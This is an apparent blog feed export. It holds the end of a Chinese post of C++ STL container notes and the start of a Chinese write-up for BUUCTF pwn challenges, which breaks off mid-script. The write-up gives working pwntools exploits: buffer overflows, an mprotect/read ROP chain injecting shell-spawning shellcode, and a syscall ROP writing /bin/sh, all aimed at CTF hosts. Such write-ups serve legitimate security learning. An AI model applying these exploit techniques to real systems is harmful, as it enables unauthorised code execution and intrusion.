若list内部为空，则回传true值 </p></li><li><p><code>list.size()</code> 回传list内实际的元素个数 </p></li><li><p><code>list.front()</code> 存取第一个元素 </p></li><li><p><code>list.back()</code> 存取最末个元素 </p></li><li><p><code>mylist.begin()</code> 首位迭代器</p></li><li><p><code>mylist.end()</code>末位迭代器</p></li><li><p>常见for循环</p><ul><li><p><code>for (auto it = mylist.begin(); it != mylist.end(); ++it)  </code></p><pre><code>                  `cout &lt;&lt; *it &lt;&lt; " ";` </code></pre></li><li><p>it是迭代器指针，不能赋值，不能运算（+=不行），只能++</p></li><li><p>list的迭代器只支持双向访问，不支持随机访问，因此不能直接进行加减操作 （和vector等区别）</p></li></ul></li><li><p><code>advance(it, n); </code>将迭代器<code>it</code>向前移动n个位置 </p></li><li><p><code>mylist.insert(it, k);</code>  向第it位迭代器位置插入新元素k（it之前）</p></li><li><p><code>mylist.erase(it);</code> 删除第it位迭代器位置所指元素</p></li><li><p><code>mylist.erase(it, it + n); </code>删除第it位到第it+n位元素（一共删除从it开始到it+n的n个元素）</p></li><li><p><code>next(it,n)</code>函数是C++ STL中的一个函数，它的作用是返回一个新的迭代器，该迭代器指向原始迭代器向前或向后移动指定距离后的位置 ，被用来移动it迭代器到下n位</p></li></ul><h3 id="vector-存放任意类型的动态数组"><a href="#vector-存放任意类型的动态数组" class="headerlink" title="vector  存放任意类型的动态数组"></a>vector  存放任意类型的动态数组</h3><ul><li><code>vector&lt;T&gt;(nSize,t)</code>创建一个vector，元素个数为nSize,且值均为t</li><li><code>vector.push_back(k)</code> 在vector尾部插入元素k</li><li><code>vector.insert(vector.begin() + 1, 2) </code> 在vector的第2个位置插入一个元素2 </li><li><code>vector.pop_back() </code> 删除vector尾部的一个元素 </li><li><code>vector.erase(v.begin() + 1) </code>删除vector的第2个元素 </li><li><code>erase()</code>方法接受两个迭代器参数，表示要删除的区间的起始位置和结束位置。被删除的区间包括起始位置的元素，但不包括结束位置的元素。 </li><li><code>vector.[0];</code> 访问vector的第1个元素 ， 可进行赋值等操作</li><li><code>vector.at(0); </code>/访问vector的第1个元素，如果越界会抛出异常 </li><li><code>for (int i = 0; i &lt; v.size(); i++) { cout &lt;&lt; v[i] &lt;&lt; " "; } </code> 遍历vector</li><li><code>vector.resize()</code> 改变实际元素的个数，新添加的元素会被默认初始化 </li><li><code>vector.size() </code>获取vector的大小 ，这是当前存储的元素数量</li><li><code>vector.capacity()</code>返回当前容量，这是目前容器最多储存的元素数量</li><li><code>vector.front() </code>返回第一个元素的引用 </li><li><code>vector.back()</code>返回最后一个元素的引用 </li><li><code>vector.begin()</code>返回指向容器中第一个元素的迭代器 </li><li><code>vector.end()</code>返回指向容器最后一个元素所在位置后一个位置的迭代器，通常和 begin() 结合使用</li><li><code>vector.empty()</code>判断一个vector是否为空</li></ul><h2 id="STL容器适配器"><a href="#STL容器适配器" class="headerlink" title="STL容器适配器"></a>STL容器适配器</h2><h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><ul><li><code>stack&lt;T&gt;</code> 创建栈对象</li><li><code>push(element)</code>：将元素压入栈顶</li><li><code>pop()</code>：弹出栈顶元素</li><li><code>top()</code>：返回栈顶元素</li><li><code>empty()</code>：返回栈是否为空</li><li><code>size()</code>：返回栈中元素的数量</li></ul><blockquote><p>清空栈操作： <code>while (!myStack.empty()) { myStack.pop(); } </code></p></blockquote><h3 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h3><ul><li><code>queue &lt;int&gt; </code> 创建queue对象</li><li><code>push(element)</code>：将元素添加到队列的末尾</li><li><code>pop()</code>：从队列的头部取出元素，并将其从队列中删除</li><li><code>front()</code>：返回队列头部的元素，但不将其从队列中删除</li><li><code>back()</code>：返回队列末尾的元素，但不将其从队列中删除</li><li><code>size()</code>：返回队列中元素的数量</li><li><code>empty()</code>：判断队列是否为空</li></ul><h3 id="priority-queue"><a href="#priority-queue" class="headerlink" title="priority_queue"></a>priority_queue</h3><ul><li><p><code>push(element)</code>：将元素添加到优先队列中，根据优先级顺序排列。</p></li><li><p><code>pop()</code>：从优先队列中取出优先级最高的元素，并将其从队列中删除。</p></li><li><p><code>top()</code>：返回优先队列中优先级最高的元素，但不将其从队列中删除。</p></li><li><p><code>size()</code>：返回优先队列中元素的数量。</p></li><li><p><code>empty()</code>：判断优先队列是否为空</p></li><li><p><code>priority_queue&lt;int, std::vector&lt;int&gt;, std::less&lt;int&gt;&gt; myMaxHeap;</code>创建大顶堆</p></li><li><p><code>less&lt;int&gt;</code>是<code>priority_queue</code>的默认比较函数，因此在创建大顶堆时可以省略第三个参数。以下是更简洁的表达式：<code>priority_queue&lt;int&gt; myMaxHeap;</code></p></li><li><p><code>priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; myMinHeap; </code> 创建小顶堆</p></li></ul><blockquote><p><code>priority_queue&lt;int, vector&lt;int&gt;,greater&lt;int&gt;&gt;</code> 指定了使用<code>greater&lt;int&gt;</code> 作为比较函数，因此创建的优先队列是升序的，即优先级数值小的元素排在队列前面。如果想要创建降序的优先队列，可以使用 <code>less&lt;int&gt;</code> 作为比较函数，例如 <code>priority_queue&lt;int, vector&lt;int&gt;, less&lt;int&gt;&gt;</code>  </p></blockquote><p>EG: 优先队列实现滑动窗口求最大值</p><pre class=" language-C++"><code class="language-C++">int main() {    int k; // 滑动窗口大小    int n;    cin >> n >> k;    vector<int> nums(n); // 输入数组    priority_queue<pair<int, int>> pq; // 定义优先队列，存放数值和下标    for (int i = 0; i < nums.size(); i++)        cin >> nums[i];    // 先将前 k 个元素加入优先队列    for (int i = 0; i < k; i++) {        pq.push({ nums[i], i });    }    // 输出第一个滑动窗口的最大值    cout << pq.top().first << " ";    // 滑动窗口向右移动，每次加入一个新元素，弹出一个旧元素    for (int i = k; i < nums.size(); i++) {        pq.push({ nums[i], i }); // 加入新元素        while (pq.top().second <= i - k) { // 弹出旧元素            pq.pop();        }        cout << pq.top().first << " "; // 输出当前滑动窗口的最大值    }    return 0;}</code></pre><h3 id="deque"><a href="#deque" class="headerlink" title="deque"></a>deque</h3><ul><li><code>push_back(element)</code>：在队尾插入一个元素。</li><li><code>pop_back()</code>：删除队尾元素。</li><li><code>push_front(element)</code>：在队头插入一个元素。</li><li><code>pop_front()</code>：删除队头元素。</li><li><code>front()</code>：返回队头元素，但不删除。</li><li><code>back()</code>：返回队尾元素，但不删除。</li><li><code>empty()</code>：如果队列为空，返回true，否则返回false。</li><li><code>size()</code>：返回队列中元素的个数。</li></ul><h3 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h3><ul><li><code>make_heap(first, last)</code>：将[first, last)区间内的元素转换为堆。</li><li><code>push_heap(first, last)</code>：将[first, last-1)区间内的元素插入堆中。</li><li><code>pop_heap(first, last)</code>：将堆顶元素移动到[last-1]位置，并重新构建堆。</li><li><code>sort_heap(first, last)</code>：将[first, last)区间内的元素排序，使其满足堆的性质。</li><li><code>is_heap(first, last)</code>：如果[first, last)区间内的元素满足堆的性质，返回true，否则返回false。</li><li><code>push()</code>：将元素添加到堆中。</li><li><code>pop()</code>：从堆中移除根节点元素。</li><li><code>top()</code>：返回堆中的根节点元素。</li><li><code>empty()</code>：检查堆是否为空。</li><li><code>size()</code>：返回堆中元素的数量。</li></ul><blockquote><p>STL中，堆是通过vector容器实现的，因此要声明一个堆对象，需要先声明一个vector容器，然后使用make_heap()函数将其转换为堆</p><p><del>不如手搓</del></p></blockquote><h3 id="pair"><a href="#pair" class="headerlink" title="pair"></a>pair</h3><p><code>template&lt;class T1, class T2&gt; struct pair;</code>其中，<code>T1</code>和<code>T2</code>表示两个不同的类型。<code>std::pair</code>类包含了两个公有成员变量<code>first</code>和<code>second</code>，分别表示这两个值。可以通过以下方式创建和访问<code>std::pair</code>对象： </p><p>编译器并不会对<code>std::vector&lt;std::pair&lt;int, int&gt;&gt;</code>中的元素顺序进行任何假设或者判断。它只会根据你的代码中对这个<code>std::vector</code>对象的使用来确定元素顺序。</p><p>例如，如果你在代码中使用<code>v[i].first</code>来访问第i个元素的第一个元素，编译器就会认为第一个元素表示数值，第二个元素表示下标。如果你使用<code>v[i].second</code>来访问第i个元素的第二个元素，编译器就会认为第一个元素表示下标，第二个元素表示数值。</p><h2 id="迭代器类型补充"><a href="#迭代器类型补充" class="headerlink" title="迭代器类型补充"></a>迭代器类型补充</h2><p>在C++中，STL容器的迭代器可以分为5种类型，分别是：</p><ol><li>输入迭代器（Input Iterator）：只读，只能单向移动，每个元素只能被访问一次。例如<code>istream_iterator</code>。</li><li>输出迭代器（Output Iterator）：只写，只能单向移动，每个元素只能被赋值一次。例如<code>ostream_iterator</code>。</li><li>前向迭代器（Forward Iterator）：可读写，只能单向移动，每个元素可以被访问或赋值多次。例如<code>forward_list</code>。</li><li>双向迭代器（Bidirectional Iterator）：可读写，可以双向移动，每个元素可以被访问或赋值多次。例如<code>list</code>。</li><li>随机访问迭代器（Random Access Iterator）：可读写，可以随机访问，支持加减运算，可以跳跃式访问容器中的元素。例如<code>vector</code>、<code>deque</code>。</li></ol><p>因此，可以根据迭代器的类型来判断容器是否支持随机访问。以下是一些常见的STL容器及其迭代器类型：</p><ol><li><code>vector</code>：支持随机访问迭代器。</li><li><code>deque</code>：支持随机访问迭代器。</li><li><code>list</code>：支持双向迭代器。</li><li><code>forward_list</code>：支持前向迭代器。</li><li><code>set</code>：支持双向迭代器。</li><li><code>map</code>：支持双向迭代器。</li><li><code>unordered_set</code>：支持前向迭代器。</li><li><code>unordered_map</code>：支持前向迭代器。</li></ol><blockquote><p>迭代器类型的不同，使得for循环的操作写法不同</p><p>支持随机访问的可以使用熟悉的写法，对元素进行操作；不支持的如双向迭代器要对迭代器进行操作</p></blockquote><p>需要注意的是，对于容器的不同操作，可能需要不同类型的迭代器。例如，对于<code>list</code>容器，如果需要在容器中间插入或删除元素，需要使用双向迭代器；而如果只是进行遍历，可以使用前向迭代器。</p><p><em><u>而且，要注意的是</u></em></p><blockquote><p><code>stack</code>是STL中的一个容器适配器，它并不是一个容器，因此没有迭代器。<code>stack</code>只提供了很少的操作，主要包括<code>push()</code>、<code>pop()</code>、<code>top()</code>、<code>empty()</code>和<code>size()</code>等方法，这些方法都是直接对栈顶元素进行操作，不需要使用迭代器来遍历栈中的元素。因此，<code>stack</code>并不属于任何一种迭代器类型。 </p></blockquote><h2 id="STL对于空间大小的规定"><a href="#STL对于空间大小的规定" class="headerlink" title="STL对于空间大小的规定"></a>STL对于空间大小的规定</h2><p>STL（标准模板库）中的容器分为两类：</p><ol><li><strong>顺序容器（Sequence Containers）</strong>：这些容器按照元素在容器中的位置来组织和存储元素。顺序容器包括<code>vector</code>、<code>deque</code>、<code>list</code>、<code>forward_list</code>、<code>array</code>。<ul><li><code>vector</code>、<code>deque</code>、<code>array</code>需要在创建容器对象时指定容器的大小，因为它们使用连续的内存存储元素，所以需要预先分配足够的内存空间。</li><li><code>list</code>、<code>forward_list</code>不需要指定容器大小，它们使用链表存储元素，可以动态地分配和释放内存。</li></ul></li><li><strong>关联容器（Associative Containers）</strong>：这些容器按照元素的键值来组织和存储元素。关联容器包括<code>set</code>、<code>multiset</code>、<code>map</code>、<code>multimap</code>。<ul><li>关联容器不需要在创建容器对象时指定容器的大小，它们使用树形结构存储元素，可以动态地分配和释放内存。</li></ul></li></ol><p>此外，还有另一种容器叫做<code>stack</code>和<code>queue</code>，它们是容器适配器（Container Adaptors），是在顺序容器的基础上提供了特定的接口，使其按照一定的规则进行操作。<code>stack</code>和<code>queue</code>都是基于顺序容器实现的，但是它们不需要指定容器的大小，因为它们使用的是顺序容器的默认构造函数，自动创建一个空的容器对象。</p><p>总之，顺序容器中的<code>vector</code>、<code>deque</code>和<code>array</code>需要指定容器大小，而<code>list</code>和<code>forward_list</code>不需要。关联容器和容器适配器都不需要指定容器大小。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="notes" scheme="http://lmarch2.github.io/categories/notes/"/>
    
    
    <category term="C++" scheme="http://lmarch2.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>远古BUUCTF的wp</title>
    <link href="http://lmarch2.github.io/posts/de339b6d/"/>
    <id>http://lmarch2.github.io/posts/de339b6d/</id>
    <published>2023-08-28T14:37:09.000Z</published>
    <updated>2024-02-04T06:46:08.370Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>搬运，BUUCTF的pwn部分题解</p><!-- toc --><ul><li><a href="#not-the-same-3dsctf-2016">not_the_same_3dsctf_2016</a><ul><li><a href="#0x01">0X01</a></li><li><a href="#0x02">0x02</a></li></ul></li><li><a href="#ciscn-2019-n-8">ciscn_2019_n_8</a></li><li><a href="#get-started-3dsctf-2016">get_started_3dsctf_2016</a><ul><li><a href="#0x00">0x00</a></li><li><a href="#0x01">0x01</a></li><li><a href="#0x02">0x02</a></li><li><a href="#0x03">0x03</a></li><li><a href="#0x04">0x04</a></li></ul></li><li><a href="#ciscn-2019-c-1">ciscn_2019_c_1</a><ul><li><a href="#0x01">0x01</a></li><li><a href="#0x02">0x02</a></li><li><a href="#0x03">0x03</a></li><li><a href="#0x04">0x04</a></li><li><a href="#0x05">0x05</a></li></ul></li><li><a href="#-ogeek2019-babyrop">[OGeek2019]babyrop</a><ul><li><a href="#0x01">0x01</a></li><li><a href="#0x02">0x02</a></li><li><a href="#0x03">0x03</a></li><li><a href="#0x04">0x04</a></li></ul></li><li><a href="#ciscn-2019-es-2">ciscn_2019_es_2</a><ul><li><a href="#0x01">0x01</a></li><li><a href="#0x02">0x02</a><ul><li><a href="#-------ebp---ebp-------------">第一步，泄露出ebp，通过ebp+偏移量的方法计算栈上地址</a></li><li><a href="#-------">第二步 栈迁移</a></li></ul></li><li><a href="#0x03">0x03</a></li><li><a href="#0x04">0x04</a></li></ul></li><li><a href="#-----------2018-rop">铁人三项(第五赛区)_2018_rop</a></li><li><a href="#pwn2-sctf-2016">pwn2_sctf_2016</a><ul><li><a href="#0x01">0x01</a></li><li><a href="#0x02">0x02</a></li></ul></li><li><a href="#bjdctf-2020-babyrop">bjdctf_2020_babyrop</a><ul><li><a href="#0x01">0x01</a></li><li><a href="#0x02">0x02</a></li></ul></li><li><a href="#-harekazectf2019-baby-rop2">[HarekazeCTF2019]baby_rop2</a><ul><li><a href="#0x01">0x01</a></li><li><a href="#0x02">0x02</a></li></ul></li><li><a href="#jarvisoj-fm">jarvisoj_fm</a></li><li><a href="#ciscn-2019-s-3">ciscn_2019_s_3</a><ul><li><a href="#0x01">0x01</a></li><li><a href="#0x02">0x02</a></li><li><a href="#0x03">0x03</a><ul><li><a href="#------ret2csu----execve">第一种做法：ret2csu控制执行execve</a></li><li><a href="#----srop">第二种：SROP</a></li></ul></li></ul></li></ul><!-- tocstop --><h1 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h1><h2 id="0X01"><a href="#0X01" class="headerlink" title="0X01"></a>0X01</h2><p>和get_started_3dsctf_2016类似</p><p><img src="https://picx.zhimg.com/80/v2-c4b46ac8776ff52321e4e0dc72bae1fb_720w.png"></p><p><img src="https://picx.zhimg.com/80/v2-95401165e52d6ae447f905feb55371c3_720w.png"></p><p><img src="https://picx.zhimg.com/80/v2-d1cebe3985838041d6c2f820cb06311a_720w.png"></p><p>大概思路是先控制程序流到get_secret函数读取flag到f14g变量，再控制返回地址为write函数输出f14g变量的内容</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">25684</span><span class="token punctuation">)</span>elf<span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">/</span>not_the_same_3dsctf_2016<span class="token punctuation">)</span>write_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>flag_addr <span class="token operator">=</span> <span class="token number">0x080ECA2D</span> get_secret <span class="token operator">=</span> <span class="token number">0x080489A0</span>payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span> <span class="token number">0x2d</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>get_secret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>第二种思路</p><p>用mprotect函数修改.plt.got表内存页权限为可读可写可执行，用read函数将shellcode注入到刚才修改的内存页中，执行shellcode  </p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">25684</span><span class="token punctuation">)</span>elf<span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">/</span>not_the_same_3dsctf_2016<span class="token punctuation">)</span>pop3_ret <span class="token operator">=</span> <span class="token number">0x0804f420</span><span class="token comment" spellcheck="true">#gadget:pop ebx; pop esi; pop ebp; ret;用来向mprotect()、read()传参</span>                     <span class="token comment" spellcheck="true">#ROPgadget --binary get_started --only 'pop|ret' | grep pop</span><span class="token comment" spellcheck="true">#为了后续再能使用栈ret,我们得构造一下栈的布局,因为mprotect函数使用到了3个参数,我们就找存在3个连续pop的指令，为啥要找3个pop,也就是在正常情况下,函数传参是使用push，所以要为了堆栈还原,函数调用结束时就使用pop来保证堆栈完好.</span>mem_addr <span class="token operator">=</span> <span class="token number">0x80eb000</span> <span class="token comment" spellcheck="true">#可读可写的内存,但不可执行</span>mem_size <span class="token operator">=</span> <span class="token number">0x1000</span>    <span class="token comment" spellcheck="true">#通过调试出来的值</span>mem_proc <span class="token operator">=</span> <span class="token number">0x7</span>       <span class="token comment" spellcheck="true">#可代表可读可写可执行</span>mprotect_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span>read_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token triple-quoted-string string">'''为了连续在堆栈中执行,就是用pop3_ret来控制esp,使它往下弹掉已用的3个值.'''</span>payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">45</span> <span class="token comment" spellcheck="true">#填充数据覆盖到ebp</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>mprotect_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#栈返回到mprotect()函数执行</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop3_ret<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#执行完mprotect的返回地址,使esp往下+12</span><span class="token comment" spellcheck="true">#mprotect 的三个参数 mprotect(0x080ea000,0x1000,0x7)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>mem_addr<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#mprotect函数参数1 修改的内存地址</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>mem_size<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#mprotect函数参数2 修改的内存大小</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>mem_proc<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#mprotect函数参数3 修改的权限</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#执行完pop3_ret后弹到read地址</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop3_ret<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#执行完read后将返回到pop3_ret指令,又继续使esp+12</span><span class="token comment" spellcheck="true">#read 的三个参数 read(0,0x080ea000,0x100)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#read函数参数1 ,从输入端读取，将我们生成的shellcode读入目标内存地址</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>mem_addr<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#读取到的内容复制到指向的内存里</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#读取大小</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>mem_addr<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#执行完read后ret esi，这里是返回到我们布置的shellcode执行</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>payload_shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'i386'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span> sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload_shellcode<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h1><p><img src="https://picx.zhimg.com/80/v2-b841ab9925da5fda5c194a34fe90e6ab_720w.png"></p><p>只需要满足<code>var[13] == 17</code>即可getshell；__isoc99_scanf()`函数没有限制输入数据的长度</p><p>exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25951</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">13</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#p32(17)=\x11\x00\x00\x00,16进制小端存储，0x11(16)=17(10)</span><span class="token comment" spellcheck="true">#这里*4是因为4字节的数组每一项要4字节才能填满，*13是把数组前13项填满，第14项用</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"What's your name?\n"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>最近持续学习栈溢出，努力熟悉各种利用方法，争取这周和下周把栈溢出这块结束</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>IDA分析</p><p><img src="http://a1.qpic.cn/psc?/V11A9QHl1NNOpd/05RlWl8gsTOH*Z17MtCBzK03nLoC8PsZaXeSN56liOsd4c*DCOl3E.KMQgiJHI7btXhUypGiZ44CEh2X3SWvZw!!/c&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=fwLCAH8CwgAWADA!&amp;tl=1&amp;tm=1690290000&amp;dis_t=1690293206&amp;dis_k=f26da0996afa3b0e0c7c761a1dbac217&amp;sce=0-12-12&amp;rf=0-18"></p><p><img src="https://pic1.zhimg.com/80/v2-8c3972c8d716c5b403ee61aa7a6124af_720w.png?source=d16d100b"></p><p>``<img src="https://picx.zhimg.com/80/v2-6546c4a99abf8ae111647ea8e5531456_720w.png"></p><p>方法一：传统栈溢出</p><p>可以看到main函数并没有ebp，寻址方式是esp寻址 </p><p>get_flag函数中，在读取flag之前先经过if判断a1 == 814536271 &amp;&amp; a2 == 425138641</p><p>构造pay时不可以试图跳过这个判断，无法打通</p><p>返回地址一定要覆盖为get_flag函数的开始处</p><p>在栈上构造get_flag参数</p><blockquote><p>payload = b’a’ * 0x38+p32(get_flag_addr)+p32(exit_addr)+p32(a1)+p32(a2)</p><p>注意这里的返回地址为exit的地址，打远程时，如果程序是异常退出了，最后是不给你回显的。所以我们得想办法让程序正常退出 </p></blockquote><p>EXP1</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'i386'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p = process('./get_started_3dsctf_2016')</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25669</span><span class="token punctuation">)</span>get_flag_addr <span class="token operator">=</span> <span class="token number">0x080489A0</span>exit_addr <span class="token operator">=</span> <span class="token number">0x804E6A0</span>a1 <span class="token operator">=</span> <span class="token number">0x308CD64F</span>a2 <span class="token operator">=</span> <span class="token number">0x195719D1</span>payload <span class="token operator">=</span> b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>get_flag_addr<span class="token punctuation">)</span><span class="token operator">+</span>p33<span class="token punctuation">(</span>exit_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>a2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h2><p>方法二：系统调用</p><p>利用ROPgadget找到需要的gadget</p><p><code>pop_eax_ret = 0x080b91e6</code></p><p><code>pop_edx_ecx_ebx_ret = 0x0806fc30</code></p><p><code>int80 = 0x0806d7e5</code></p><p>但是没有找到”/bin/sh”字符串，考虑在其他寄存器写入/bin/sh，再赋值给edx</p><p>看看有没有类似的mov指令</p><p><code>mov_edx_eax_ret = 0x080557ab</code></p><p><del>你猜猜我mov_edx_eax_ret怎么找的（裂开）</del></p><p><img src="https://picx.zhimg.com/80/v2-21ea8eba239f70d3814cc987604f6b83_720w.png"></p><p>可以看到，该处指令<code>mov    [edx], eax</code> 是将eax寄存器里的值写到eedx所存的地址处[edx]，攻击的思路就是讲[edx]地址覆盖为/bin/sh写入地址，并利用eax寄存器将字符串/bin/sh存入。</p><p>需要注意的是，该程序没有给出可用的bss段变量，栈空间一般情况下开启ASLR地址随机，所以我们用vmmap查找可读的内存空间作为入/bin/sh的地址</p><p><a href="https://www.shawroot.cc/2010.html">这篇参考的链接</a>，使用0x080eb020 作为存放/bin/sh的地址，但是使用vmmap可以看到没有以这个地址开头或结束的段，而且也不存在可写可执行的段，只有0x80ea000到0x80ec000是可写的文件段（实际上0x080eb020 也在该段中）</p><p>补充一下，同时其实我们可以看出来vmmap出来的地址段是没有libc中的内容的，实际上get_started_3dsctf_2016是静态链接</p><p><img src="https://pic4.zhimg.com/80/v2-3f0871a35e36bb1b4168d14429be1647_720w.webp"></p><p><img src="https://pic1.zhimg.com/80/v2-262a105cb813d69dda9de13c35a7ecc0_720w.png"></p><p><img src="https://pica.zhimg.com/80/v2-8eb67977ab589ae1dff2debc6163b811_720w.png"></p><p>整体的rop流程为，分两次每次四字节将”/bin” “/sh\x00”先存入eax，再利用Pop将edx置为0x80ea000，再利用mov指令将字符串放入该地址指向空间，最后返回系统调用</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>local <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> local <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./get_started_3dsctf_2016'</span><span class="token punctuation">)</span><span class="token 